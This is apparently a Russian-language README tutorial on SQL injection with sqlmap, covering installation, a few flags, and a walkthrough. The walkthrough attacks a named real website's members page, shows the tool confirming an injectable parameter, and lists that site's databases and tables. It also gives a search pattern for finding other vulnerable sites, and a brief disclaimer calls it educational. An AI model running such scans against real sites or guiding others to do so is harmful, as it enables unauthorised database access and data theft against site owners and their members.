# ДИСКЛАЙМЕР
>Автор не несёт отвественность за ваши действия
Все действия в данной статьи созданы в исключительно ознокамительных целях(Для повышения уровня информационной безопастности),автор никого не побуждает совершать данные действия,все что вы будите делать это сугобо ваша ответственность.

# Предысловие
>Если не умру,буду дальше развивать эту тему

Идея которая пришла мне в голову,<<А почему бы не рассказать об уязвимостях SQL?>>.Поэтому я буду рассказывать о разных уязвимостях SQLInject и также демонстрировать их.Некоторая информация была взята из открытых источников,поэтому некоторые цитаты или словосочитания могу совпадать с некоторыми статьями или с wikipedia.

В папке exaple,будут лежать примеры скриптом связанные с SQL уязвимостями,если кому интересно можете их разобрать а также добавить свои <<Все комментария и замечание я буду читать>>

P.S Спасибо за понимание :>

# PART1 >> Основа работы GET запроса

## Что такое SQLInject?
SQLInject - это способ взлома сайта,работающий с базами данных,основанный на внедрении в запрос произвольного SQL-кода,атаки такого типа могут дать злоумышленнику
доступ к базе данных.

Например:

1.  Доступ к чтению и редактированию файлов 
2.  Внедрение своих скриптов 
3.  Выполнение произвольных команд на атакуемом сервере

Также хотел бы вас познакомить с инструментом **sqlmap**.Их домашняя страница <https://sqlmap.org/>.Мы будем разбирать работу с **sqlmap**,а так же его флаги,чтобы понять как пользоваться инструментом.

### Sqlmap
sqlmap - это инструмент с открытым исходным кодом для тестирования на проникновение, который автоматизирует процесс выявления и эксплуатации уязвимости SQL-инъекця и захват серверов баз данных. Он поставляется с мощным движком выявления и многими нишевыми функциями для конечного тестера на проникновение, имеет широкий набор возможностей, начиная от сбора отпечатков баз данных по полученной от них данным, до доступа к файловой системе и выполнения команд в операционной системе посредством внеполосных (out-of-band) подключений.

В sqlmap находится около 150 флагов,поэтому мы будем их разбирать походу нужды.

*Пример установки:*

1. Для Kali,Debian

На Kali Linux sqlmap установлен по умолчанию,для Debian установка выглядит следующим образом. 

```sh
git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
cd sqlmap-dev/
./sqlmap.py --wizard
```

2.  Для Arch,Manjaro

```sh
Sudo pacman -S sqlmap
```
3. Для Windows

Для работы sqlmap нам потребуется python <https://www.python.org/>,там есть две ветви 3.* и 2.* для корректной работы нам нужна версия 2.* (На данный момент доступна версия 2.7.18),заходим на офицальный сайт sqlmap <https://sqlmap.org/> и скачиваем от туда .zip файл.

Теперь переходим в каталог с установленным Python (По дефолту он находится по пути C:\Python27\) и перетаскиваем его в окно командной строки,в командной строке должен появиться полный путь к файлу,после этого дописываем к нему флаг -v.

Если у вас появилась информация о версии Python значит установка прошла нормально.
После проверки открываем новую командную строку,распаковываем наш sqlmap,перетаскиваем файл python.exe в командную строку,ставим пробел и перетаскиваем наш sqlmap.py в командную строку,ставим пробел и пишим флаг -h.Должен получиться такой путь 

```sh
C:\Python27\python.exe C:\Users\User\Downloads\sqlmapproject-sqlmap-6cc092b\sqlmap.py -h
```

#### Пример использования 

Для начала работы с sqlmap нам нужно найти какой либо уязвимый сайт,ссылка сайта которая (возможного!!!) поддерживая уязвимости sqlinject выглядит следующим образом.Такие сайты можно найти по такому поисковому запросу (В будующем я буду пополнять ссылки).

Запрос:
```sh
index.php?id=1
```

Ссылка:
```sh
http://www.asfaa.org/members.php?id=1
```

Флаги которые используются в данном мануале:

```sh
-u URL,                 Целевой хост
-A --random-agent,      Использование значение заголовка User-Agent 
--tables,               Построить список таблиц
-D  DB                  База данных для перечисления
-T  TBL                 Таблицы базы данных для перечисления
```


1. Сканнирование удалённой системы

В качастве примеры мы будем использовать этот сайт.

```sh
http://www.asfaa.org/members.php?id=1
```

Первая команда сканирует удаленную систему, чтобы увидеть, уязвима ли она для внедрения sql, а затем собирает информацию о ней. 


```sh
sqlmap -u http://www.asfaa.org/members.php?id=1 --random-agent
```

Вышеупомянутая первая и самая простая команда.Она проверяет входные параметры,чтобы определить,уязвимо ли она на внедрение sql или нет.Для этого sqlmap отправляет полезные-sql-нагрузки во входные параметры и проверяя выходные данные.

2.  Как мы видим sqlmap нашёл уязвимостей.

```sh
[INFO] testing 'Generic inline queries'
[INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[[INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[INFO] GET parameter 'id' is 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)' injectable 
[INFO] testing 'MySQL inline queries'
[INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[WARNING] time-based comparison requires larger statistical model, please wait.. (done)                                                                                                               
[INFO] testing 'MySQL >= 5.0.12 stacked queries'
[INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
```

Второй командой мы будем искать таблицы базы,чтобы в дальнейшем смотреть их содержимое))

Запуск команды:

```sh
sqlmap -u http://www.asfaa.org/members.php?id=1 --tables  
```
Видим что есть несколько баз с данными

```sh
[INFO] fetching tables for databases: 'db83231_acolop, db83231_asfaa, information_schema'
```

Таблица содержимого:

```sh
Database: information_schema                                                                                                                                                                                     
[72 tables]
+---------------------------------------+
| CHARACTER_SETS                        |
| CLIENT_STATISTICS                     |
| COLLATIONS                            |
| COLLATION_CHARACTER_SET_APPLICABILITY |
| COLUMNS                               |
| COLUMN_PRIVILEGES                     |
| ENGINES                               |
| EVENTS                                |
| FILES                                 |
| GLOBAL_STATUS                         |
| GLOBAL_TEMPORARY_TABLES               |
| GLOBAL_VARIABLES                      |
| INDEX_STATISTICS                      |
| INNODB_BUFFER_PAGE                    |
| INNODB_BUFFER_PAGE_LRU                |
| INNODB_BUFFER_POOL_STATS              |
| INNODB_CHANGED_PAGES                  |
| INNODB_CMP                            |
| INNODB_CMPMEM                         |
| INNODB_CMPMEM_RESET                   |
| INNODB_CMP_PER_INDEX                  |
| INNODB_CMP_PER_INDEX_RESET            |
| INNODB_CMP_RESET                      |
| INNODB_FT_BEING_DELETED               |
| INNODB_FT_CONFIG                      |
| INNODB_FT_DEFAULT_STOPWORD            |
| INNODB_FT_DELETED                     |
| INNODB_FT_INDEX_CACHE                 |
| INNODB_FT_INDEX_TABLE                 |
| INNODB_LOCKS                          |
| INNODB_LOCK_WAITS                     |
| INNODB_METRICS                        |
| INNODB_SYS_COLUMNS                    |
| INNODB_SYS_DATAFILES                  |
| INNODB_SYS_FIELDS                     |
| INNODB_SYS_FOREIGN                    |
| INNODB_SYS_FOREIGN_COLS               |
| INNODB_SYS_INDEXES                    |
| INNODB_SYS_TABLES                     |
| INNODB_SYS_TABLESPACES                |
| INNODB_SYS_TABLESTATS                 |
| INNODB_TRX                            |
| KEY_COLUMN_USAGE                      |
| OPTIMIZER_TRACE                       |
| PARAMETERS                            |
| PARTITIONS                            |
| PLUGINS                               |
| PROCESSLIST                           |
| PROFILING                             |
| REFERENTIAL_CONSTRAINTS               |
| ROUTINES                              |
| SCHEMATA                              |
| SCHEMA_PRIVILEGES                     |
| SESSION_STATUS                        |
| SESSION_VARIABLES                     |
| STATISTICS                            |
| TABLES                                |
| TABLESPACES                           |
| TABLE_CONSTRAINTS                     |
| TABLE_PRIVILEGES                      |
| TABLE_STATISTICS                      |
| TEMPORARY_TABLES                      |
| THREAD_STATISTICS                     |
| TRIGGERS                              |
| USER_PRIVILEGES                       |
| USER_STATISTICS                       |
| VIEWS                                 |
| XTRADB_INTERNAL_HASH_TABLES           |
| XTRADB_READ_VIEW                      |
| XTRADB_RSEG                           |
| XTRADB_ZIP_DICT                       |
| XTRADB_ZIP_DICT_COLS                  |
+---------------------------------------+

Database: db83231_acolop
[14 tables]
+---------------------------------------+
| events                                |
| exd_image_list                        |
| fotos                                 |
| galeria                               |
| image_list                            |
| image_listcaps                        |
| links                                 |
| membros                               |
| news                                  |
| news_cat                              |
| news_img                              |
| newsletter                            |
| postal                                |
| videos                                |
+---------------------------------------+

Database: db83231_asfaa
[11 tables]
+---------------------------------------+
| atelier                               |
| categorias                            |
| content                               |
| content_files                         |
| content_fotos                         |
| content_links                         |
| content_types                         |
| members                               |
| news                                  |
| news_backup                           |
| tipos                                 |
+---------------------------------------+
```

3. Например я хочу узнать db83231_asfaa.Для этого мы будем использовать флаг --tables,тем более нам нужно указать базу через флаг -D(Хотя это мы узнавали в прошлой команде)

```sh
Database: db83231_asfaa                                                                                                                                                                                          
[11 tables]
+---------------+
| atelier       |
| categorias    |
| content       |
| content_files |
| content_fotos |
| content_links |
| content_types |
| members       |
| news          |
| news_backup   |
| tipos         |
+---------------+
```
